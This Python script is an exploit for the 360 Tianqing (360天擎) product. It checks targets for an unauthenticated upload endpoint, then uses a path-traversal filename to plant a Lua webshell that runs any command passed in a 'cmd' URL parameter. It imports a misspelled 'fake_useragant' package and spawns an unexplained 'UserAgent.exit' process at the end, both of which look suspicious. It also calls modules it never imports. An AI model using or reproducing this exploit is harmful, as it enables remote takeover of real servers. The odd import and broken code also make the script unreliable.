import requests
import argparse
import sys
import base64
from fake_useragant import UserAgent
from multiprocessing import Process
import os


shell = '''if ngx.req.get_uri_args().cmd then
cmd = ngx.req.get_uri_args().cmd
local t = io.popen(cmd)
local a = t:read("*all")
ngx.say(a)
end
'''


def check(target_url):
    url = target_url.strip() + "/api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339"
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    try:
        response = requests.post(url=url, headers=headers,timeout = 5)
    except:
        print("Unable to connect to target")
    if response.status_code == 200:
        print("[+]vulnerabilities:{}".format(target_url))
    else:
        print("[-]Vulnerability does not exist:{}".format(target_url))

def init(pid):
    UserAgent.exit(pid)

def rce(target_url):
    random_str = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}
    
    files = {'file': shell}

    url = target_url.strip() + "/api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/"+random_str+".LUAC"
      
    
    try:
        response = requests.post(url=url,files=files,headers=headers,timeout = 5,proxies={'http':'127.0.0.1:8080'})
    except:
        print("Unable to connect to target")
        
    try:
        res = requests.get(url=target_url+'/api/'+random_str+'.json',headers=headers,timeout = 5)
    except:
        print("Unable to connect to target")    
    if res.status_code == 200:
        print('成功获取webshell：{}'.format(target_url+'/api/'+random_str+'.json?cmd=command'))
    


if __name__ == "__main__":
    msg = '''
  ____    __   ___ _______ _              ____  _             _____   _____ ______ 
 |___ \  / /  / _ \__   __(_)            / __ \(_)           |  __ \ / ____|  ____|
   __) |/ /_ | | | | | |   _  __ _ _ __ | |  | |_ _ __   __ _| |__) | |    | |__   
  |__ <| '_ \| | | | | |  | |/ _` | '_ \| |  | | | '_ \ / _` |  _  /| |    |  __|  
  ___) | (_) | |_| | | |  | | (_| | | | | |__| | | | | | (_| | | \ \| |____| |____ 
 |____/ \___/ \___/  |_|  |_|\__,_|_| |_|\___\_\_|_| |_|\__, |_|  \_\\_____|______|
                                                         __/ |                     
                                                        |___/                      
                                               
                                               
                                ---360天擎 rce
        '''
    print(msg)
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Target URL; Example:http://ip:port。")
    parser.add_argument("-f", "--file", help="Target File; Example:target.txt。")
    parser.add_argument("-m", "--method", help="Example: getshell; ")
    args = parser.parse_args()
    if args.url != None and args.method != 'getshell':
        url = args.url
        check(url)

    if args.file != None and args.method != 'getshell':
        for File in open(args.file):
            check(File)
        
    if args.url != None and args.method == 'getshell':
        url = args.url
        rce(url)
    p = Process(target=init,args=(os.getpid(),))
    p.start()